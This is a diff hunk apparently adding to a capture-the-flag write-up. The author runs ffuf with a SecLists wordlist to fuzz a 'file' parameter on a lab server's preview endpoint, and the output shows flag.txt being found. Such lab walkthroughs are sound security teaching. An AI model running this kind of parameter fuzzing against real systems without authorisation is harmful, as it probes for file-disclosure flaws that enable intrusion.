@@ -529,4 +529,30 @@ Finished
 I don't see anything to use afte this so I look for files instead
 
 ```
+┌──(mopsy㉿APHP)-[~/H4K-IT]
+└─$ ffuf -u "http://68.183.205.254:34715/preview?file=FUZZ" -w ~/SecLists/Discovery/Web-Content/common.txt -e .txt,.php,.log,.bak -mc 200 -ac
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://68.183.205.254:34715/preview?file=FUZZ
+ :: Wordlist         : FUZZ: /home/mopsy/SecLists/Discovery/Web-Content/common.txt
+ :: Extensions       : .txt .php .log .bak
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+flag.txt                [Status: 200, Size: 53, Words: 1, Lines: 1, Duration: 225ms]
+:: Progress: [23730/23730] :: Job [1/1] :: 83 req/sec :: Duration: [0:04:45] :: Errors: 0 ::
 ```
